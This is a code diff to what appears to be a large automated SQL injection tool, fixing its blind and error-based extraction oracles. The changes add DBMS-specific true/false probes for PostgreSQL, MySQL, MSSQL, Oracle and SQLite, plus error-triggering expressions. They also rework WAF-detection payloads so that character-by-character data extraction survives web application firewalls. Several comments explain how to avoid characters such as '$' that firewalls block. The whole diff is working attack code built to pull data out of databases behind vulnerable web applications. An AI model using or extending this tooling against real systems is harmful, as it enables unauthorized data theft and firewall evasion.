@@ -128369,7 +128369,14 @@ class MultiStrategyExtractor:
                     # BUG-MSE-X-REQUEST-ID FIX: x-request-id removed — per-request UUID
                     # always differs between two requests → always sets _hdr_diff=True →
                     # false error oracle (same logic as BUG-NEW-B in PCV Check D).
-                    for _hk in ("x-upstream-status", "x-error", "x-debug", "via",
+                    # BUG-VIA-HEADER FIX: "via" removed — the Via header is a CDN/proxy-hop
+                    # indicator that changes when requests are routed through different CDN
+                    # edge nodes.  Storing the error-probe's "via" value and comparing it
+                    # against extraction probes routed through a different node causes the
+                    # oracle to return False for every extraction probe → all bits 0 →
+                    # empty string extracted.  Only include headers that are stable across
+                    # requests from the same client IP and reflect DB-level error state.
+                    for _hk in ("x-upstream-status", "x-error", "x-debug",
                                 "x-powered-by", "content-type"):
                         if _eh.get(_hk, "") != _oh.get(_hk, ""):
                             _hdr_diff = True
@@ -129258,11 +129265,39 @@ class MultiStrategyExtractor:
                     continue
                 # Round 2: real extraction-style condition
                 if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
-                    _real_true = "current_catalog>=$$$$"   # always true (>= empty string)
-                    _real_false = "current_catalog>=$$zzzzzzzzz$$"  # likely false
+                    # BUG-PG-DOLLAR-QUOTE FIX (MEDIUM-HIGH, PostgreSQL/CockroachDB/YugabyteDB/
+                    # Amazon Redshift, MSE oracle validation, all extraction techniques):
+                    # The previous conditions used PostgreSQL dollar-quoting ($$...$$):
+                    #   current_catalog >= $$$$           (empty string, always TRUE)
+                    #   current_catalog >= $$zzzzzzzzz$$  (likely FALSE)
+                    # Dollar-quoting requires the `$` character in the payload.  WAFs that
+                    # filter or block `$` (common because `$` is used in command injection,
+                    # shell variable expansion, and regex anchors) will block these probes.
+                    # The validation oracle probe returns a WAF block page → oracle rejected
+                    # even though it works correctly on the DB side.
+                    # Fix: use CHAR_LENGTH() on a system column — no string literals,
+                    # no special characters, works on all PG-wire-compatible DBMSes.
+                    # CHAR_LENGTH(current_catalog)>0   → TRUE (catalog name always non-empty)
+                    # CHAR_LENGTH(current_catalog)>99999 → FALSE (names never > 99999 chars)
+                    _real_true = "CHAR_LENGTH(current_catalog)>0"
+                    _real_false = "CHAR_LENGTH(current_catalog)>99999"
                 elif self.dbms in ("MySQL", "MariaDB"):
-                    _real_true = "@@version>=0x00"         # always true
-                    _real_false = "@@version>=0x7a7a7a7a7a"  # likely false
+                    # BUG-MYSQL-REAL-COND FIX (MEDIUM, MySQL/MariaDB, MSE oracle validation,
+                    # all extraction techniques, all surfaces, all HTTP methods):
+                    # The previous conditions used hex varbinary literals:
+                    #   @@version >= 0x00          → compares VARCHAR to BINARY(1)
+                    #   @@version >= 0x7a7a7a7a7a  → compares VARCHAR to BINARY(5)
+                    # MySQL/MariaDB perform implicit BINARY→VARCHAR collation conversion
+                    # that is charset-dependent and varies across MySQL versions (5.6/5.7/8.0)
+                    # and strict_mode settings.  In some combinations this raises implicit
+                    # collation coercion errors → oracle sees error → r3 == r4 == True →
+                    # misleading "WAF may block" warning, or false oracle rejection.
+                    # Fix: use LENGTH() which returns an integer — no type coercion,
+                    # no string delimiter, works on all MySQL/MariaDB versions and modes.
+                    # LENGTH(@@version)>0   → TRUE (@@version is always non-empty)
+                    # LOCATE('ZZZZZZZZZZ',@@version)>0 → FALSE (no version has ZZZZZZZZZZ)
+                    _real_true = "LENGTH(@@version)>0"
+                    _real_false = "LOCATE('ZZZZZZZZZZ',@@version)>0"
                 elif self.dbms in ("MSSQL", "Sybase"):
                     # BUG-FRESH-V214-5 FIX (MEDIUM, MSSQL/Sybase, MSE oracle validation,
                     # all extraction techniques, all surfaces, all HTTP methods):
@@ -129285,6 +129320,24 @@ class MultiStrategyExtractor:
                     # MSSQL string functions, no type coercion, no SQL errors.
                     _real_true  = "LEN(@@VERSION)>0"
                     _real_false = "CHARINDEX(N'ZZZZZZZZZZ',@@VERSION)>0"
+                elif self.dbms == "Oracle":
+                    # BUG-ORACLE-MSE-REAL-COND FIX (MEDIUM, Oracle, MSE oracle validation):
+                    # Oracle fell through to the generic "1<2"/"1>2" arithmetic fallback.
+                    # While those are logically correct, they exercise only the injection
+                    # path, not the DB-function execution path.  A WAF that blocks Oracle
+                    # metadata queries (SYS_CONTEXT, v$) but allows arithmetic would falsely
+                    # validate an oracle whose actual extraction probes are WAF-blocked.
+                    # Fix: use LENGTH(SYS_CONTEXT('USERENV','DB_NAME'))>0 which calls an
+                    # Oracle system context function (privilege-free, granted to PUBLIC) —
+                    # the same class of function used in extraction, so WAF blocking it is
+                    # detected here before 200× wasted extraction requests.
+                    _real_true  = "LENGTH(SYS_CONTEXT('USERENV','DB_NAME'))>0"
+                    _real_false = "LENGTH(SYS_CONTEXT('USERENV','DB_NAME'))>99999"
+                elif self.dbms == "SQLite":
+                    # BUG-SQLITE-MSE-REAL-COND FIX (LOW, SQLite, MSE oracle validation):
+                    # Similar: use sqlite_version() which is always present and non-empty.
+                    _real_true  = "LENGTH(sqlite_version())>0"
+                    _real_false = "LENGTH(sqlite_version())>99999"
                 else:
                     _real_true = "1<2"
                     _real_false = "1>2"
@@ -146900,6 +146953,35 @@ class ConditionalErrorTypeOracle:
             "raiserror": "RAISERROR('x',16,1)",
             "overflow": "CONVERT(TINYINT, 999)",
         },
+        # BUG-ORACLE-ERRTYPE-MISSING FIX (MEDIUM, Oracle, ConditionalErrorTypeOracle,
+        # Novel Technique 8, all surfaces, all HTTP methods):
+        # Oracle was absent from ERROR_TYPES.  The fallback {"div_zero": "1/0"} works
+        # in a CASE WHEN context (Oracle uses lazy/short-circuit evaluation for CASE,
+        # so the ELSE branch executes only when the condition is FALSE → ORA-01476
+        # division by zero).  But the WAF check code used CAST(1 AS VARCHAR) and
+        # SUBSTRING() — neither of which is valid Oracle SQL (Oracle requires
+        # CAST(1 AS VARCHAR2(1)) / TO_CHAR(1) and SUBSTR() respectively).  The WAF
+        # check raised a SQL error, making its status-comparison meaningless, and the
+        # correct oracle could be incorrectly accepted or rejected.
+        # Fix: add an explicit Oracle entry so Oracle uses an error expression that is
+        # unambiguously valid in Oracle SQL.  The WAF check Oracle-specific path is
+        # fixed separately in calibrate() below.
+        "Oracle": {
+            "div_zero": "1/0",
+            "cast_fail": "CAST('x' AS NUMBER)",
+            "invalid_num": "TO_NUMBER('x')",
+        },
+        # BUG-SQLITE-ERRTYPE FIX (LOW, SQLite, ConditionalErrorTypeOracle):
+        # SQLite integer division by zero returns NULL, not an error.  The fallback
+        # {"div_zero": "1/0"} caused calibrate() to try CASE WHEN ... ELSE (1/0) END
+        # — which returns NULL in the ELSE branch.  If the application returns different
+        # body sizes for NULL vs integer 1 responses, calibrate() might accept the oracle
+        # even though it is non-functional for actual extraction (the ELSE branch never
+        # raises a distinguishable error, so all extraction bits read False → all chars
+        # extracted as NUL → empty string).  Setting SQLite to {} causes the calibration
+        # loop to skip all error types immediately and return None, which is the correct
+        # behaviour: SQLite does not support a reliable CASE-WHEN error oracle.
+        "SQLite": {},
     }
 
     @classmethod
@@ -146954,7 +147036,30 @@ class ConditionalErrorTypeOracle:
                 # Unicode (e.g. U+FE9C7 as observed in the scan log).
                 # Fix: use a SELECT subquery with CAST to simulate the actual extraction form
                 # (which always wraps the DB query in a subquery inside SUBSTRING).
-                _waf_chk_s = f"CASE WHEN (ASCII(SUBSTRING((SELECT CAST(1 AS VARCHAR)),1,1))=0) THEN 1 ELSE ({eexpr}) END"
+                # BUG-ORACLE-WAF-CHECK-SQL FIX (HIGH, Oracle, ConditionalErrorTypeOracle.calibrate,
+                # Novel Technique 8 status path, all surfaces):
+                # The original WAF check used SUBSTRING() and CAST(1 AS VARCHAR) which are
+                # invalid Oracle SQL (Oracle requires SUBSTR() and TO_CHAR(1) / VARCHAR2).
+                # The SQL syntax error caused the probe to return an error-status response;
+                # since error_status ≠ clean_status was the condition for triggering the
+                # WAF check at all, the WAF check itself returned the wrong status, making
+                # the status comparison meaningless and allowing corrupt oracles to pass.
+                # Fix: use DBMS-appropriate SQL for the WAF check probe so it correctly
+                # simulates the SQL keywords that actual extraction probes use.
+                if dbms in ("Oracle",):
+                    # Oracle: SUBSTR (not SUBSTRING), TO_CHAR (not CAST(...AS VARCHAR))
+                    # ASCII(SUBSTR(TO_CHAR(1),1,1))=0 → ASCII('1')=49, 49=0=FALSE → ELSE fires
+                    _waf_chk_s = f"CASE WHEN (ASCII(SUBSTR(TO_CHAR(1),1,1))=0) THEN 1 ELSE ({eexpr}) END"
+                elif dbms in ("MySQL", "MariaDB", "TiDB"):
+                    # MySQL/MariaDB: ORD(MID()) is extraction-accurate form; use subquery to
+                    # match actual extraction probe structure
+                    _waf_chk_s = f"CASE WHEN (ORD(MID((SELECT CAST(1 AS CHAR)),1,1))=0) THEN 1 ELSE ({eexpr}) END"
+                elif dbms in ("MSSQL", "Sybase"):
+                    _waf_chk_s = f"CASE WHEN (UNICODE(SUBSTRING((SELECT CAST(1 AS NVARCHAR(1))),1,1))=0) THEN 1 ELSE ({eexpr}) END"
+                elif dbms == "SQLite":
+                    _waf_chk_s = f"CASE WHEN (UNICODE(SUBSTR(CAST(1 AS TEXT),1,1))=0) THEN 1 ELSE ({eexpr}) END"
+                else:
+                    _waf_chk_s = f"CASE WHEN (ASCII(SUBSTRING((SELECT CAST(1 AS VARCHAR)),1,1))=0) THEN 1 ELSE ({eexpr}) END"
                 try:
                     _fp_waf_s, _ = await send_fn(_waf_chk_s)
                     _waf_s_status = getattr(_fp_waf_s, 'status_code', 0) if _fp_waf_s else 0
@@ -146990,7 +147095,20 @@ class ConditionalErrorTypeOracle:
                     # path.  Constant CAST(1 AS VARCHAR) passes WAFs that block subqueries
                     # or DB function calls; replace with (SELECT CAST(1 AS VARCHAR)) to
                     # simulate the actual extraction probe form and catch WAF false-positives.
-                    _waf_check = f"CASE WHEN (ASCII(SUBSTRING((SELECT CAST(1 AS VARCHAR)),1,1))&1=0) THEN 1 ELSE ({eexpr}) END"
+                    # BUG-ORACLE-WAF-CHECK-SQL FIX (length path): same DBMS-specific
+                    # SQL fix as the status path above.  Oracle requires SUBSTR/TO_CHAR;
+                    # MySQL/MariaDB/TiDB use ORD(MID()); MSSQL uses UNICODE/NVARCHAR;
+                    # SQLite uses UNICODE/TEXT; others use ASCII/SUBSTRING/VARCHAR.
+                    if dbms in ("Oracle",):
+                        _waf_check = f"CASE WHEN (ASCII(SUBSTR(TO_CHAR(1),1,1))&1=0) THEN 1 ELSE ({eexpr}) END"
+                    elif dbms in ("MySQL", "MariaDB", "TiDB"):
+                        _waf_check = f"CASE WHEN (ORD(MID((SELECT CAST(1 AS CHAR)),1,1))&1=0) THEN 1 ELSE ({eexpr}) END"
+                    elif dbms in ("MSSQL", "Sybase"):
+                        _waf_check = f"CASE WHEN (UNICODE(SUBSTRING((SELECT CAST(1 AS NVARCHAR(1))),1,1))&1=0) THEN 1 ELSE ({eexpr}) END"
+                    elif dbms == "SQLite":
+                        _waf_check = f"CASE WHEN (UNICODE(SUBSTR(CAST(1 AS TEXT),1,1))&1=0) THEN 1 ELSE ({eexpr}) END"
+                    else:
+                        _waf_check = f"CASE WHEN (ASCII(SUBSTRING((SELECT CAST(1 AS VARCHAR)),1,1))&1=0) THEN 1 ELSE ({eexpr}) END"
                     try:
                         _fp_waf, _ = await send_fn(_waf_check)
                     except Exception:
@@ -147125,6 +147243,35 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
             return ""
     except Exception as _sanity_exc:
         LOG.debug("[Novel] %s: oracle sanity check error (non-fatal): %s", label, _sanity_exc)
+    await asyncio.sleep(delay * 0.3)
+
+    # BUG-BITWISE-CHAR-SANITY FIX: Add a second sanity check using the CHAR function
+    # template (ascii_tmpl) instead of the length template.  This catches a split-corrupt
+    # oracle where LENGTH probes work correctly (so sanity check #1 passes) but char probes
+    # are stuck at true_sig — typically because the WAF blocks ASCII(SUBSTRING(...)) or
+    # Oracle's CASE/ASCIISTR/SUBSTR complex expression while allowing LENGTH().
+    # Without this check, char_val=max_for_dbms (all bits set, e.g. 65535 for Oracle)
+    # is within _novel_char_hi → chr(65535) is appended for every position → garbage string.
+    # Use ascii_fn at pos=1 with &0=1 (always false regardless of the string content).
+    try:
+        _char_sanity_fn = ascii_tmpl.format(q=query, p=1)
+        if dbms == "Oracle":
+            _char_sanity_cond = f"BITAND({_char_sanity_fn},0)=1"
+        elif dbms == "Firebird":
+            _char_sanity_cond = f"BIN_AND({_char_sanity_fn},0)=1"
+        elif dbms == "ClickHouse":
+            _char_sanity_cond = f"bitAnd({_char_sanity_fn},0)=1"
+        else:
+            _char_sanity_cond = f"{_char_sanity_fn}&0=1"
+        _char_sanity_r = await eval_fn(_char_sanity_cond)
+        if _char_sanity_r:
+            LOG.warning("[Novel] %s: CHAR oracle sanity FAILED (always-false char condition "
+                        "returned True) — WAF blocks char-function probes; aborting extraction",
+                        label)
+            return ""
+    except Exception as _char_sanity_exc:
+        LOG.debug("[Novel] %s: char oracle sanity check error (non-fatal): %s",
+                  label, _char_sanity_exc)
     await asyncio.sleep(delay * 0.3)
 
     # Extract chars
